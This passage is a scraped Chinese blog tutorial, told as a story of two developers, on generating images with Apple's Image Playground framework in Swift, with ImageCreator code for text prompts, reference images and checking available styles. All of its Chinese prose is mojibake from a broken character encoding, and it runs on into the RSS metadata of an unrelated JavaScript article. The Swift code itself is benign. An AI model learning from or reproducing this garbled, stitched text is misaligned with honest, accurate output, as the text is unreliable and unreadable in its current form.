<li>ğŸ‰ ç»ˆç« ï¼šé»æ˜å‰çš„ Demo</li>
</ul>
<p>â€œåˆ«æ…Œï¼ŒZoeã€‚Apple æœ€è¿‘æ”¾äº†ä¸ªå¤§æ‹›ï¼Œå’±ä»¬ä¸ç”¨é€ è½®å­ï¼Œç›´æ¥å¬å”¤ <strong>Image Playground</strong> æ¡†æ¶ï¼Œè®© iPhone è‡ªå·±ç”»ã€‚â€</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/669da9e67bc541ee8a3cdaccf51d5570~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936892&amp;x-signature=Cnsp0o6TVEzlqWfBFYMij69OLYU%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-1">ğŸ›  ç¬¬ä¸€ç« ï¼šå¬å”¤ç¥ç¬”é©¬è‰¯ â€”â€” ImageCreator</h2>
<p>Leo æŒ‡ç€å±å¹•å¯¹ Zoe è¯´ï¼šâ€œåœ¨ Swift çš„ä¸–ç•Œé‡Œï¼Œæƒ³è¦æ— ä¸­ç”Ÿæœ‰ï¼Œé¦–å…ˆå¾—æ‹¿åˆ°é‚£æ”¯â€˜ç¥ç¬”â€™ã€‚è¿™ä¸ªæ ¸å¿ƒç±»å°±æ˜¯ <code>ImageCreator</code>ã€‚â€</p>
<p>Image Playground æ¡†æ¶ä¸ºæˆ‘ä»¬æä¾›äº†å¼ºå¤§çš„ <strong>æ–‡æœ¬è½¬å›¾ç‰‡ï¼ˆText-to-Imageï¼‰</strong> åŠŸèƒ½ã€‚è¿™ä¸ä»…ä»…æ˜¯ç®€å•çš„æ»¤é•œï¼Œè€Œæ˜¯çœŸæ­£çš„ç”Ÿæˆå¼ AIã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/278107f7e28146eb998b7e774b77f22e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936892&amp;x-signature=U3OLtlLc2dxX3wS5oQqf2xVY%2BtE%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>Leo ç†Ÿç»ƒåœ°æ•²ä¸‹äº†ç¬¬ä¸€æ®µä»£ç ï¼š</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">import</span> ImagePlayground

<span class="hljs-keyword">public</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Eye</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">init</span>() {}
    
    <span class="hljs-comment">// è¿™ä¸ªå‡½æ•°å°±æ˜¯æˆ‘ä»¬çš„â€œå¤©çœ¼â€ï¼Œè´Ÿè´£æŠŠæ–‡å­—å…·è±¡åŒ–</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">visualize</span>(<span class="hljs-params">text</span>: <span class="hljs-type">String</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-type">CGImage</span>? {
        <span class="hljs-comment">// 1. å°è¯•åˆå§‹åŒ–é€ ç‰©ä¸» ImageCreator</span>
        <span class="hljs-comment">// æ³¨æ„ï¼šå¦‚æœè®¾å¤‡ä¸æ”¯æŒ AI ç”Ÿæˆï¼ˆæ¯”å¦‚è€å¤è‘£æœºå‹ï¼‰ï¼Œè¿™é‡Œä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œ</span>
        <span class="hljs-comment">// å°±åƒä½ è¯•å›¾åœ¨è¯ºåŸºäºšä¸Šè¿è¡Œ 3A å¤§ä½œä¸€æ ·ã€‚</span>
        <span class="hljs-keyword">let</span> creator <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> <span class="hljs-type">ImageCreator</span>()

        <span class="hljs-comment">// 2. å¼€å§‹ç”Ÿæˆå›¾ç‰‡</span>
        <span class="hljs-comment">// for: å®šä¹‰ç”Ÿæˆçš„æ¦‚å¿µï¼ˆè¿™é‡Œçº¯æ–‡æœ¬ï¼‰</span>
        <span class="hljs-comment">// style: é£æ ¼é€‰æ‹©ç´ æ</span>
        <span class="hljs-comment">// limit: æˆ‘ä»¬åªéœ€è¦ä¸€å¼ ï¼Œæ¯•ç«Ÿç®—åŠ›ä¹Ÿæ˜¯é’±</span>
        <span class="hljs-keyword">let</span> images <span class="hljs-operator">=</span> creator.images(
            for: [.text(text)],
            style: .sketch,
            limit: <span class="hljs-number">1</span>
        )

        <span class="hljs-comment">// 3. è¿™æ˜¯ä¸€ä¸ªå¼‚æ­¥åºåˆ—ï¼Œå›¾ç‰‡ä¼šåƒå›è½¬å¯¿å¸ä¸€æ ·ä¸€ä¸ªä¸ªå‡ºæ¥</span>
        <span class="hljs-keyword">for</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> image <span class="hljs-keyword">in</span> images {
            <span class="hljs-keyword">return</span> image.cgImage
        }

        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
    }
}
</code></pre>
<p>â€œçœ‹ï¼Œâ€ Leo è§£é‡Šé“ï¼Œâ€œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ª <code>ImageCreator</code> å®ä¾‹ã€‚è¿™ä¸ªåˆå§‹åŒ–è¿‡ç¨‹å¯èƒ½ä¼šå¤±è´¥ï¼ˆThrow Errorï¼‰ï¼Œæ¯•ç«Ÿä¸æ˜¯æ‰€æœ‰æ‰‹æœºéƒ½è£…å¾—ä¸‹è¿™ä¹ˆå¤§çš„è„‘å­ã€‚æ¥ç€ï¼Œæˆ‘ä»¬å®šä¹‰äº†æƒ³è¦çš„ç”»é¢â€”â€”è¿™å°±æ˜¯ <code>concepts</code>ã€‚â€</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/207270f4174845129e7837c1be153c3e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936892&amp;x-signature=ZoyUXY6uqcGRb8cLBUSNRW2u8xc%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-2">ğŸ­ ç¬¬äºŒç« ï¼šç‚¼é‡‘æœ¯çš„é…æ–¹ â€”â€” æ¦‚å¿µä¸é£æ ¼</h2>
<p>Zoe å‡‘è¿‡æ¥çœ‹äº†çœ‹ä»£ç ï¼Œçš±çœ‰é—®é“ï¼šâ€œåªèƒ½ç”Ÿæˆç´ æå—ï¼Ÿè€ç‹é‚£ä¸ªäººä½ ä¹ŸçŸ¥é“ï¼Œä¸€ä¼šè¦äº”å½©æ–‘æ–“çš„é»‘ï¼Œä¸€ä¼šè¦èµ›åšæœ‹å…‹çš„çº¢ã€‚â€</p>
<p>Leo ç¬‘äº†ç¬‘ï¼šâ€œæ”¾å¿ƒï¼Œ<code>ImageCreator</code> çš„ <code>images</code> å‡½æ•°æ¥æ”¶ä¸‰ä¸ªå…³é”®å‚æ•°ï¼Œå°±åƒç‚¼é‡‘æœ¯çš„ä¸‰å¤§è¦ç´ ï¼š</p>
<ol>
<li><strong>Conceptsï¼ˆæ¦‚å¿µï¼‰ï¼š</strong> è¿™æ˜¯åŸæ–™ã€‚</li>
<li><strong>Styleï¼ˆé£æ ¼ï¼‰ï¼š</strong> è¿™æ˜¯ç«å€™ã€‚</li>
<li><strong>Limitï¼ˆé™åˆ¶ï¼‰ï¼š</strong> è¿™æ˜¯äº§é‡ã€‚â€</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bbb91d9b8c994ffbbf194a8527d5483d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936892&amp;x-signature=j3VlNHrye%2FYAqXnCx9m5JDNkaBg%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>ç›®å‰æ”¯æŒçš„é£æ ¼åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong><code>.animation</code> (åŠ¨ç”»é£)</strong>ï¼šé€‚åˆäºŒæ¬¡å…ƒæµ“åº¦é«˜çš„åœºæ™¯ã€‚</li>
<li><strong><code>.illustration</code> (æ’ç”»é£)</strong>ï¼šç²¾è‡´ï¼Œé€‚åˆé…å›¾ã€‚</li>
<li><strong><code>.sketch</code> (ç´ æé£)</strong>ï¼šæ­£å¦‚æˆ‘ä»¬ä¸Šé¢ç”¨çš„ï¼Œç®€çº¦è€Œä¸ç®€å•ã€‚</li>
</ul>
<p>â€œè‡³äºäº§é‡ï¼Œâ€ Leo è¡¥å……é“ï¼Œâ€œç³»ç»Ÿé™åˆ¶æœ€å¤šä¸€æ¬¡ç”Ÿæˆ <strong>4</strong> å¼ å›¾ç‰‡ã€‚æ¯•ç«Ÿæ‰‹æœºå‘çƒ­å¤ªä¸¥é‡çš„è¯ï¼Œç”¨æˆ·ä¼šä»¥ä¸ºæˆ‘ä»¬å¼€å‘çš„æ˜¯æš–æ‰‹å®ã€‚â€</p>
<p>æœ€å¦™çš„æ˜¯ï¼Œ<code>images</code> å‡½æ•°è¿”å›çš„æ˜¯ä¸€ä¸ª <strong><code>AsyncSequence</code></strong>ã€‚è¿™æ„å‘³ç€å›¾ç‰‡ä¸æ˜¯ä¸€è‚¡è„‘æ‰”ç»™ä½ ï¼Œè€Œæ˜¯åƒæŒ¤ç‰™è†ä¸€æ ·ï¼Œç”Ÿæˆå¥½ä¸€å¼ å°±åå‡ºä¸€å¼ ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨ <code>for loop</code> æ­é… <code>await</code> æ¥é€ä¸ªæ¥æ”¶ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/34f285b91ed64a9798ff460db2dbb2cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936892&amp;x-signature=vIsNH5jlpBbIrk5VyMcjZXXxv0M%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-3">ğŸ§© ç¬¬ä¸‰ç« ï¼šæ··åˆåŒæ‰“ â€”â€” å›¾ç”Ÿå›¾</h2>
<p>â€œé‚£å¦‚æœç”¨æˆ·ç”»äº†ä¸ªè‰å›¾ï¼Œæƒ³è®© AI å¸®ä»–æ¶¦è‰²å‘¢ï¼Ÿâ€Zoe ä¾ç„¶å¿§å¿ƒå¿¡å¿¡ï¼Œâ€œæ¯”å¦‚è€ç‹ç»å¸¸ç”»ä¸€äº›åªæœ‰ä»–è‡ªå·±çœ‹å¾—æ‡‚çš„ç«æŸ´äººã€‚â€</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1247161f11fa4798a76a5b7cc7644653~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936892&amp;x-signature=VOoqwJlV3SQ3mvgh2zkwYRLHkUQ%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€œæˆè¯­è¯´å¾—å¥½ï¼Œ<strong>æŠ›ç –å¼•ç‰</strong>ã€‚â€ Leo æ•²å‡»ç€é”®ç›˜ï¼Œâ€œæˆ‘ä»¬å¯ä»¥æ··åˆä½¿ç”¨å¤šä¸ªæ¦‚å¿µï¼ˆConceptsï¼‰ã€‚æ—¢ç»™å®ƒæ–‡å­—ï¼Œåˆç»™å®ƒå‚è€ƒå›¾ã€‚â€</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Eye</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">init</span>() {}
    
    <span class="hljs-comment">// è¿™æ¬¡æˆ‘ä»¬è¦ä¼ å…¥ä¸€å¼ å‚è€ƒå›¾ image</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">visualize</span>(<span class="hljs-params">text</span>: <span class="hljs-type">String</span>, <span class="hljs-params">image</span>: <span class="hljs-type">CGImage</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-type">CGImage</span>? {
        <span class="hljs-keyword">let</span> creator <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> <span class="hljs-type">ImageCreator</span>()

        <span class="hljs-comment">// æ³¨æ„è¿™é‡Œï¼šæ•°ç»„é‡ŒåŒæ—¶æ”¾å…¥äº† .text å’Œ .image</span>
        <span class="hljs-comment">// AI ä¼šç»“åˆä½ çš„å’’è¯­ï¼ˆæ–‡å­—ï¼‰å’Œä½ çš„çµé­‚ç”»ä½œï¼ˆå›¾ç‰‡ï¼‰æ¥ç”Ÿæˆç»“æœ</span>
        <span class="hljs-keyword">let</span> images <span class="hljs-operator">=</span> creator.images(
            for: [.text(text), .image(image)],
            style: .sketch,
            limit: <span class="hljs-number">1</span>
        )

        <span class="hljs-keyword">for</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> image <span class="hljs-keyword">in</span> images {
            <span class="hljs-keyword">return</span> image.cgImage
        }

        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
    }
}
</code></pre>
<p><code>ImagePlaygroundConcept</code> ç±»å‹æä¾›äº†ä¸€ç³»åˆ—é™æ€æ–¹æ³•æ¥æ„å»ºè¿™äº›æ¦‚å¿µã€‚é™¤äº†æˆ‘ä»¬ç”¨åˆ°çš„ <code>.text()</code> å’Œ <code>.image()</code>ï¼Œè¿˜æœ‰ä¸¤ä¸ªç‹ è§’è‰²ï¼š</p>
<ul>
<li><strong><code>.drawing()</code></strong>ï¼šå…è®¸ä½ ä¼ å…¥ PencilKit æ¡†æ¶ä¸­çš„ <code>PKDrawing</code> å¯¹è±¡ã€‚è¿™æ„å‘³ç€ç”¨æˆ·çš„æ‰‹ç»˜ç¬”è¿¹å¯ä»¥ç›´æ¥ä½œä¸ºè¾“å…¥ã€‚</li>
<li><strong><code>.extracted()</code></strong>ï¼šè¿™ä¸ªæ›´å‰å®³ï¼Œæ¯”å¦‚ä½ æ‰”è¿›å»ä¸€ç¯‡é•¿ç¯‡å¤§è®ºçš„æ–‡ç« ï¼ˆæ¯”å¦‚è€ç‹é‚£åˆè‡­åˆé•¿çš„éœ€æ±‚æ–‡æ¡£ï¼‰ï¼Œå®ƒèƒ½ä»ä¸­æå–æ ¸å¿ƒæ„å›¾æ¥ç”Ÿæˆå›¾ç‰‡ã€‚</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7ad4543a531c461ab38296cde4ba8ad5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936892&amp;x-signature=kxq%2FZ64YSUG1ITvbjEwYOjXGpsI%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-4">ğŸ›¡ ç¬¬å››ç« ï¼šé˜²å¾¡å¼ç¼–ç¨‹ â€”â€” åˆ«è®©è€æ‰‹æœºç‚¸äº†</h2>
<p>æ­¤æ—¶ï¼ŒZoe æ‹¿å‡ºäº†å¥¹é‚£å°æˆ˜æŸç‰ˆçš„å¤‡ç”¨æœºï¼šâ€œé‚£åœ¨è¿™å°è€æ‰‹æœºä¸Šèƒ½è·‘å—ï¼Ÿâ€</p>
<p>Leo æ‘‡äº†æ‘‡å¤´ï¼Œè¡¨æƒ…ä¸¥è‚ƒèµ·æ¥ï¼šâ€œæŠ€æœ¯å†å¥½ï¼Œä¹Ÿæ€•ç¡¬ä»¶æ‹‰èƒ¯ã€‚å¹¶ä¸æ˜¯æ‰€æœ‰é£æ ¼åœ¨æ‰€æœ‰è®¾å¤‡ä¸Šéƒ½å¯ç”¨ã€‚ä½œä¸ºä¸€ä¸ªç¨³å¥çš„å·¥ç¨‹å¸ˆï¼Œæˆ‘ä»¬è¦å­¦ä¼š<strong>çœ‹èœä¸‹ç¢Ÿ</strong>ã€‚â€</p>
<p><code>ImageCreator</code> æä¾›äº†ä¸€ä¸ªé™æ€å±æ€§å« <code>availableStyles</code>ã€‚è¿™æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå‘Šè¯‰æˆ‘ä»¬åœ¨å½“å‰è®¾å¤‡ä¸Šåˆ°åº•èƒ½ç©å“ªäº›èŠ±æ ·ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a09cdda1732d4e519e61a92893d455dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936892&amp;x-signature=VIMjZfSpu2hVq5qshMfEZ6HUz%2Fw%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€œä¸ºäº†é˜²æ­¢ App å´©æºƒå¯¼è‡´è€ç‹å€Ÿæœºæ‰£å·¥èµ„ï¼Œæˆ‘ä»¬å¿…é¡»åŠ ä¸Šå®‰å…¨æ£€æŸ¥ï¼šâ€</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Eye</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">init</span>() {}
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">visualize</span>(<span class="hljs-params">text</span>: <span class="hljs-type">String</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-type">CGImage</span>? {
        <span class="hljs-keyword">let</span> creator <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> <span class="hljs-type">ImageCreator</span>()

        <span class="hljs-comment">// 1. å…ˆçœ‹çœ‹å½“å‰è®¾å¤‡æ”¯æŒå•¥é£æ ¼ï¼Œå¦‚æœå•¥éƒ½ä¸æ”¯æŒï¼Œè¶æ—©æ”¶å·¥</span>
        <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> availableStyle <span class="hljs-operator">=</span> creator.availableStyles.first <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
        }

        <span class="hljs-comment">// 2. åªæœ‰å½“è®¾å¤‡æ˜ç¡®æ”¯æŒåŠ¨ç”»é£(.animation)æ—¶ï¼Œæˆ‘ä»¬æ‰ç”¨å®ƒ</span>
        <span class="hljs-comment">// å¦åˆ™å°±ç”¨è®¾å¤‡æ”¯æŒçš„ç¬¬ä¸€ä¸ªé£æ ¼å‡‘åˆä¸€ä¸‹</span>
        <span class="hljs-comment">// è¿™å«â€œé€€è€Œæ±‚å…¶æ¬¡â€ï¼Œä¹Ÿæ˜¯ç”Ÿå­˜çš„æ™ºæ…§</span>
        <span class="hljs-keyword">let</span> style <span class="hljs-operator">=</span> <span class="hljs-operator">!</span>creator.availableStyles.contains(.animation) <span class="hljs-operator">?</span> availableStyle : .animation

        <span class="hljs-keyword">let</span> images <span class="hljs-operator">=</span> creator.images(
            for: [.text(text)],
            style: style,
            limit: <span class="hljs-number">1</span>
        )

        <span class="hljs-keyword">for</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> image <span class="hljs-keyword">in</span> images {
            <span class="hljs-keyword">return</span> image.cgImage
        }

        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
    }
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/510004f47f854798a312d90814ccf1fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936892&amp;x-signature=lUv8yUN9yNDl0e%2By4vaHXCniz7M%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-5">ğŸ‰ ç»ˆç« ï¼šé»æ˜å‰çš„ Demo</h2>
<p>çª—å¤–ï¼Œä¸œæ–¹çš„å¤©ç©ºå·²ç»æ³›èµ·äº†é±¼è‚šç™½ã€‚</p>
<p>Leo ç‚¹å‡»äº†è¿è¡ŒæŒ‰é’®ã€‚æ¨¡æ‹Ÿå™¨ä¸Šï¼Œéšç€è¾“å…¥â€œä¸€åªåœ¨å†™ä»£ç çš„ç–²æƒ«çŒ«å’ªâ€ï¼Œå±å¹•ä¸Šç¬é—´æµ®ç°å‡ºä¸€å¼ ç¥æ€ç”ŸåŠ¨ã€å……æ»¡è‰ºæœ¯æ„Ÿçš„ç´ ææ’ç”»ã€‚çŒ«å’ªçœ¼é‡Œçš„çº¢è¡€ä¸éƒ½ä¾ç¨€å¯è§ï¼Œåƒæäº†æ­¤åˆ»çš„ Leoã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f884d437aa544de0b1a83dd833bd9351~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936892&amp;x-signature=p7Mc8Bnu2gl1%2FSv6wE9lvcgFSt0%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>Zoe æƒŠå¹é“ï¼šâ€œå“‡ï¼è¿™ç®€ç›´æ¯”æˆ‘ç†¬å¤œç”»çš„è¿˜è¦å¿«ï¼â€</p>
<p>Image Playground æ¡†æ¶ç¡®å®å°† Apple çš„ç”Ÿæˆå¼ AI èƒ½åŠ›å®Œç¾åœ°èå…¥äº† Swiftã€‚å®ƒä¸ä»…è®©<strong>æ–‡æœ¬è½¬å›¾ç‰‡</strong>å˜å¾—æ˜“å¦‚åæŒï¼Œè¿˜èƒ½å¤„ç†æ‰‹ç»˜å’Œç°æœ‰ç…§ç‰‡ã€‚ä»…ä»…å‡ åè¡Œä»£ç ï¼Œå°±ä¸º App æ³¨å…¥äº†è€ç‹æ¢¦å¯ä»¥æ±‚çš„â€œçµé­‚â€ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/369bac5d329b42fe807779db03faa948~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936892&amp;x-signature=vO8mjIcWH%2FYVrcFP5Jf%2FMBcFXHs%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€œæå®šã€‚â€ Leo åˆä¸Šç”µè„‘ï¼Œå¯¹ Zoe çœ¨äº†çœ¨çœ¼ï¼Œâ€œèµ°å§ï¼Œå»åƒæ—©é¥­ã€‚ç­‰è€ç‹é†’æ¥çœ‹åˆ°è¿™ä¸ª Demoï¼Œä¼°è®¡åˆè¯¥æƒ³å‡ºä»€ä¹ˆâ€˜AI ç”Ÿæˆäº”å½©æ–‘æ–“çš„é»‘â€™çš„æ–°éœ€æ±‚äº†ã€‚â€</p>
<p>Zoe ç¬‘äº†ï¼šâ€œåªè¦ä½ ä¸è„±å‘ï¼Œä»€ä¹ˆéœ€æ±‚éƒ½å¥½è¯´ã€‚â€</p>
<p>è¿™å°±æ˜¯ Swift å¼€å‘è€…çš„æ—¥å¸¸â€”â€”ç”¨æœ€ä¼˜é›…çš„ä»£ç ï¼Œè§£å†³æœ€æ£˜æ‰‹çš„é—®é¢˜ï¼Œé¡ºä¾¿åœ¨é»‘è‰²çš„å¹½é»˜ä¸­ï¼Œå¯»æ‰¾é‚£ä¸€æŠ¹æŠ€æœ¯çš„äº®è‰²ã€‚</p>
<p><strong>æ„Ÿè°¢é˜…è¯»ï¼Œå¦‚æœå®å­ä»¬ä¹Ÿæƒ³ä¿ä½å‘é™…çº¿ï¼Œè®°å¾—å…³æ³¨æˆ‘å“¦ã€‚ä¸‹å›è§ï¼ğŸ‘‹</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/db95400a72b649969de14ee3cdc9641b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936892&amp;x-signature=YLwLa6qJcDKafRXFx6q7Dr%2BrXmQ%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»æ··ä¹±åˆ°ä¼˜é›…ï¼šè¿™5ä¸ªç°ä»£JavaScriptæŠ€å·§è®©ä½ çš„ä»£ç æ€§èƒ½æå‡50%]]></title>    <link>https://juejin.cn/post/7581870491756052515</link>    <guid>https://juejin.cn/post/7581870491756052515</guid>    <pubDate>2025-12-10T00:16:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581870491756052515" data-draft-id="7581870491756036131" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»æ··ä¹±åˆ°ä¼˜é›…ï¼šè¿™5ä¸ªç°ä»£JavaScriptæŠ€å·§è®©ä½ çš„ä»£ç æ€§èƒ½æå‡50%"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-10T00:16:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ©™çš„ç™¾å®ç®±"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»æ··ä¹±åˆ°ä¼˜é›…ï¼šè¿™5ä¸ªç°ä»£JavaScriptæŠ€å·§è®©ä½ çš„ä»£ç æ€§èƒ½æå‡50%
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ©™çš„ç™¾å®ç®±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T00:16:41.000Z" title="Wed Dec 10 2025 00:16:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
